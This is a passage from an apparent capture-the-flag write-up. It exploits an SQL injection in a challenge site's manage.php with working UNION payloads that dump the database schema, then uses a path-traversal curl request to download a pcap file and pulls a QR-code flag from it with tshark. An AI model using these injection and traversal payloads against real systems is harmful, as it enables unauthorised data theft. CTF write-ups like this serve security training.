             2
             Sensor 2
             Temperature Sensors
             1
             3
             Sensor 3
             Radiation Sensors
             1
```
By using the vulnerability above, we can leak the source code:
```php
query($sql);
?>
    GE CTF - Managment - Sensors List
                Managment - Sensors List
                  id
                  name
                  description
                  status
            num_rows > 0) {
                // output data of each row
                while($row = $result->fetch_assoc()) {
                  $id = htmlspecialchars($row['id'],ENT_QUOTES);
                  $name = htmlspecialchars($row['name'],ENT_QUOTES);
                  $description = htmlspecialchars($row['description']);
                  $status = htmlspecialchars($row['status'],ENT_QUOTES);
                  echo "
                     $id
                     $name
                     $description
                     $status
                  ";
                }
              } else {
                echo "0 Results";
              }
            }
            $conn->close();
          ?>
```
There's a pretty obvious SQL injection here:
```sql
$sql = "SELECT * FROM `ge_sensors` where `name` like '%$sname%'";
```
Let's create a small PoC by visiting `manage.php?sname=' and '1'='1' union select 1,2,3,4 from ge_sensors where '1' like '1`, to receive:
```html
            id
            name
            description
            status
             1
             Sensor 1
             Vision and Imaging Sensors
             1
             2
             Sensor 2
             Temperature Sensors
             1
             3
             Sensor 3
             Radiation Sensors
             1
             1
             2
             3
             4
```
Now that we know it works, we can start to dump the database structure. We visit `manage.php?sname=' and '1'='1' union select 1,2,group_concat(schema_name),4 from information_schema.schemata where '1' like '1` and get the schema names: `information_schema,ge_ctf`. We visit `manage.php?sname=' and '1'='1' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema like 'ge_ctf` and get the table names: `ge_files,ge_sensors`. We visit `manage.php?sname=' and '1'='1' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name like 'ge_file` to get the column names for `ge_files`, and get: `name`. Finally, we dump the table: `manage.php?sname=' and '1'='1' union select 1,2,group_concat(name),4 from ge_files where '1' like '1` which results in `/var/www/html/index.php,/var/www/html/login.php,/var/www/html/status.php,/var/www/html/manage.php,/var/www/html/system_status/health.txt,/PLC-traffic-test.pcap`.
The PCAP file looks interesting, let's get it:
```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl "https://gechallenge.com/ge-ctf/status.php?r=....//....//....//....//....//PLC-traffic-test.pcap" -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba' -s -o PLC-traffic-test.pcap
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ file PLC-traffic-test.pcap
PLC-traffic-test.pcap: pcapng capture file - version 1.0
```
Let's check what we see there:
```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ tshark -qz io,phs -r PLC-traffic-test.pcap
===================================================================
Protocol Hierarchy Statistics
Filter:
eth                                      frames:365 bytes:145581
  ipv6                                   frames:35 bytes:3280
    icmpv6                               frames:30 bytes:2580
    udp                                  frames:5 bytes:700
      mdns                               frames:3 bytes:450
      dhcpv6                             frames:2 bytes:250
  ip                                     frames:308 bytes:141107
    udp                                  frames:46 bytes:5324
      dns                                frames:28 bytes:2538
      mdns                               frames:14 bytes:1918
      ssdp                               frames:4 bytes:868
    tcp                                  frames:258 bytes:135543
      http                               frames:8 bytes:6346
        data-text-lines                  frames:2 bytes:1178
        png                              frames:1 bytes:3809
          tcp.segments                   frames:1 bytes:3809
      tls                                frames:91 bytes:96767
        tcp.segments                     frames:32 bytes:45812
          tls                            frames:26 bytes:37895
    igmp                                 frames:4 bytes:240
  arp                                    frames:22 bytes:1194
===================================================================
```
The things that jump to the eye are the HTTP requests and the PNG file. We'll start with the HTTP request:
```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ tshark -nr PLC-traffic-test.pcap -Y 'http'
    9 0.630578364 192.168.1.30 → 142.250.186.174 HTTP 140 GET / HTTP/1.1
   11 0.708023209 142.250.186.174 → 192.168.1.30 HTTP 594 HTTP/1.1 301 Moved Permanently  (text/html)
   86 37.915692649 192.168.1.30 → 172.67.178.63 HTTP 131 GET / HTTP/1.1
   88 37.998487691 172.67.178.63 → 192.168.1.30 HTTP 788 HTTP/1.1 301 Moved Permanently
  121 77.359704534 192.168.1.30 → 18.192.24.246 HTTP 145 GET / HTTP/1.1
  123 77.428334918 18.192.24.246 → 192.168.1.30 HTTP 584 HTTP/1.1 301 Moved Permanently  (text/html)
  191 116.454603923 192.168.1.30 → 192.168.1.77 HTTP 155 GET /FLAG.png HTTP/1.1
  209 116.458045593 192.168.1.77 → 192.168.1.30 HTTP 3809 HTTP/1.0 200 OK  (PNG)
```
We see that the request is for `FLAG.png`, let's dump the file:
```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ tshark -r PLC-traffic-test.pcap -o "tcp.desegment_tcp_streams: TRUE" -o "tcp.no_subdissector_on_error: FALSE" --export-objects "http,exported_objects" | grep png
  191 116.454603923 192.168.1.30 → 192.168.1.77 HTTP 155 GET /FLAG.png HTTP/1.1
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ file exported_objects/FLAG.png
exported_objects/FLAG.png: PNG image data, 660 x 273, 8-bit/color RGBA, non-interlaced
```
The image has a QR code:
```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ zbarimg exported_objects/FLAG.png
QR-Code:https://gechallenge.com/Go0d_JoB_GE-D1GIT4L.html
scanned 1 barcode symbols from 1 images in 0.04 seconds
```
And we're done.